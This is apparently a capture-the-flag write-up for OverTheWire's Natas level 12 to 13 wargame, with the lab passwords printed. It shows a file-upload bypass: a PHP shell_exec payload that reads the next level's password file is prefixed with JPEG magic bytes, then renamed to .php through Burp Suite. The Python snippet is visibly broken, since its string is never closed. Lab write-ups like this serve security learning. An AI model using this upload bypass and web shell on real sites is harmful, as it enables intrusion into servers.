# Natas Level 12 --> Level 13

**Username:** natas13

**Password:** jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY  

**URL:**      http://natas13.natas.labs.overthewire.org

## Solution
* Open inspect, there are button to upload an image (1kb) and button send us to a page contain the source code.
* If you read the source code it is like the last one, generate random path with extention taken from requests to uploaded file, then put it in upload folder.
* Write php script echo the password from pass folder
```php
<?php
  echo shell_exec("cat /etc/natas_webpass/natas14");
?>
```
* Now if you upload it, he will say only images are allowed, from source code you know that they check file type using exif_imagetype() php function which reads the magic number for the file.
* So first write JPEG magic number then your php script (to make magic number interprete as bytes we use pyhon3)
```py
  file = open('image', 'wb')
  file.write(b'\xFF\xD8\xFF\xE0' + b'<? echo shell_exec("cat /etc/natas_webpass/natas14"); 
  file.close()
```
* Upload the script then intercept requests with burpSuite to change filename extension to php to execute script onclick
* You got the password!!

## Natas14 Password
> Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
